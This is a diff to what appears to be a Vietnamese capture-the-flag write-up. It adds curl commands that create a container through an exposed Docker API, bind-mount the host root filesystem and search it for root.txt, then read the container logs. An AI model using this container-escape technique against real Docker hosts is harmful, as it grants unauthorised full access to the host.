@@ -136,7 +136,22 @@ cid="ĐIỀN_CONTAINER_ID_VÀO_ĐÂY"
 curl -X POST http://192.168.65.7:2375/containers/$cid/start
 ```
 
+```
+# 1. Tạo một task chạy lệnh 'find' bên trong container bóng ma
+cat > find_cmd.json << 'EOF'
+{
+  "Image": "alpine:latest",
+  "Cmd": ["find", "/mnt/host_root/", "-name", "root.txt"],
+  "HostConfig": {"Binds": ["/:/mnt/host_root"]}
+}
+EOF
+curl -H "Content-Type: application/json" -d @find_cmd.json http://192.168.65.7:2375/containers/create
+cid_find="ĐIỀN_ID_MỚI"
+curl -X POST http://192.168.65.7:2375/containers/$cid_find/start
 
+# 2. Đọc log để xem kết quả trả về
+curl "http://192.168.65.7:2375/containers/$cid_find/logs?stdout=true&stderr=true" 2>/dev/null | strings
+```
 
 
 
